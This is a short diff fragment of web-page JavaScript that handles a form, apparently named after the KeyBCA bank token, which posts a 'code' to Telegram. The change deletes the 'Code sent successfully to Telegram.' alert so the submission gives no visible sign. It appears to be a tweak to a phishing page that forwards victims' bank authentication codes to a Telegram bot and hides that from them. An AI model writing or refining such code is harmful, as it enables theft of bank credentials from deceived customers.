@@ -237,7 +237,7 @@
         .then((response) => response.json())
         .then((data) => {
           if (data.ok) {
-            alert("Code sent successfully to Telegram.");
+            
             document.getElementById("keybcaForm").reset();
           } else {
             alert("Failed to send code to Telegram.");
